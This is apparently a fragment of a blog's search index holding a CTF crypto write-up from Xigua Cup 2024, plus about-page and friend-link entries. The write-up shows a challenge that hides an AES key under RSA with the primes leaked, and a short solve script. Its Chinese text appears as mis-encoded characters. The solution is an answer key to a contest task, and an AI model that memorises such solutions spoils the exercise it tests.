å¯†æ–‡ï¼Œéšè— key = b'flag{***}' # ä¼šè¯å¯†é’¥ï¼Œéšè— iv = b'flag{1fake_flag}' # AESåç§»å‘é‡ï¼Œå·²çŸ¥ # å¯¹æ˜æ–‡è¿›è¡Œå¡«å……ï¼Œä½¿å…¶é•¿åº¦ç¬¦åˆAESåŠ å¯†çš„è¦æ±‚ padded_plaintext = pad(flag, AES.block_size) # åˆ›å»ºAESåŠ å¯†å¯¹è±¡ cipher = AES.new(key, AES.MODE_CBC, iv) # åŠ å¯† ciphertext = cipher.encrypt(padded_plaintext) # åŠ å¯†åçš„æ–‡æœ¬é€šå¸¸æ˜¯å­—èŠ‚ä¸²ï¼Œè½¬æˆæ•´æ•°ä¾¿äºè¿›è¡Œä¼šè¯å¯†é’¥çš„RSAåŠ å¯† c1 = bytes_to_long(ciphertext) print(f'c1 = {c1}') # éå¯¹ç§°åŠ å¯† m = bytes_to_long(key) e = 0x10001 p = getPrime(1024) q = getPrime(1024) n = p * q c = pow(m,e,n) print(f'p = {p}') print(f'q = {q}') print(f'n = {n}') print(f'c2 = {c}') # print(\"hint:keyéœ€è¦è½¬æˆå­—èŠ‚æµä¹Ÿå°±æ˜¯b''\") æ€è·¯ å­—å¤šï¼Œä½†æ˜¯ä¸éš¾ï¼Œå…ˆæŠŠkeyç®—å‡ºæ¥ï¼Œivåç§»é‡å·²çŸ¥ï¼Œé‚£ä¹ˆå…¨éƒ½å‡ºæ¥äº† exp c1= c2= p= q= n= e= from Crypto.Util.number import* phi=(p-1)*(q-1) d=inverse(e,phi) key=pow(c2,d,n) iv = b'flag{1fake_flag}' from Crypto.Cipher import AES cipher = AES.new(long_to_bytes(key), AES.MODE_CBC, iv) plaintext = cipher.decrypt(long_to_bytes(c1)) print(plaintext) ","date":"2024-12-12","objectID":"/%E8%A5%BF%E7%93%9C%E6%9D%AF2024_crypto/:0:0","tags":["crypto"],"title":"è¥¿ç“œæ¯2024_crypto","uri":"/%E8%A5%BF%E7%93%9C%E6%9D%AF2024_crypto/"},{"categories":[],"content":"å…³äºæˆ‘ ","date":"1970-01-01","objectID":"/about/:0:0","tags":[],"title":"å…³äº","uri":"/about/"},{"categories":[],"content":"ä¸ªäººä¿¡æ¯ é™¢æ ¡: TKKC æˆ˜é˜Ÿ: Bluebud \u0026 wgpsec ä¸“ä¸š: è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯ å­¦ä¹ æ–¹å‘: å‰åç«¯å¼€å‘ï¼ŒCTF - crypto / æ¸—é€ / pwn ","date":"1970-01-01","objectID":"/about/:1:0","tags":[],"title":"å…³äº","uri":"/about/"},{"categories":[],"content":"è”ç³»æ–¹å¼ QQ: 2924465428 ","date":"1970-01-01","objectID":"/about/:2:0","tags":[],"title":"å…³äº","uri":"/about/"},{"categories":[],"content":"å…³äºåšå®¢ æ­¤åšå®¢äº2024å¹´å¹´åˆæ­å»ºï¼Œè‡³2025å¹´å·²æ¢æˆ Hugo æ„å»ºã€‚åšå®¢ä¸»è¦ç”¨æ¥è®°å½•å­¦ä¹ ç¬”è®°ä»¥åŠä¸€äº›æŠ€æœ¯åˆ†äº«ï¼Œå¸Œæœ›é€šè¿‡è®°å½•è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ï¼Œä¸å¤§å®¶ä¸€èµ·è¿›æ­¥ã€‚ ","date":"1970-01-01","objectID":"/about/:3:0","tags":[],"title":"å…³äº","uri":"/about/"},{"categories":[],"content":" BornLeader10 ä¸€èµ·å­¦ä¹  è¶…è¶Šæƒ…ç»ª å˜å¾—æ›´å¼º å¤§é¦™è•‰ 23å±Šwebæ‰‹ Redçš„å°å±‹ ä¼šé•¿webç¥ï¼ SkyAsh çš„å°çª åœ¨å–è¯å’Œå¤§æ•°æ®ä¸Šå¥‹åŠ›æ”€çˆ¬çš„å’¸é±¼ snoo2y å—ä¿¡å¤§çš„ç½‘å®‰ä¼šé•¿ ztr çš„å°çª è®°å½• ztr çš„å­¦ä¹ ä¸ç”Ÿæ´»ã€‚ iyheart åˆ†äº«å­¦ä¹ å†ç¨‹ä¸ç¬”è®° 3a0-Eminem ä¸€ä¸ªå¾ˆå¼ºçš„webå¸ˆå‚… ","date":"1970-01-01","objectID":"/friend/:0:0","tags":[],"title":"å‹é“¾","uri":"/friend/"}]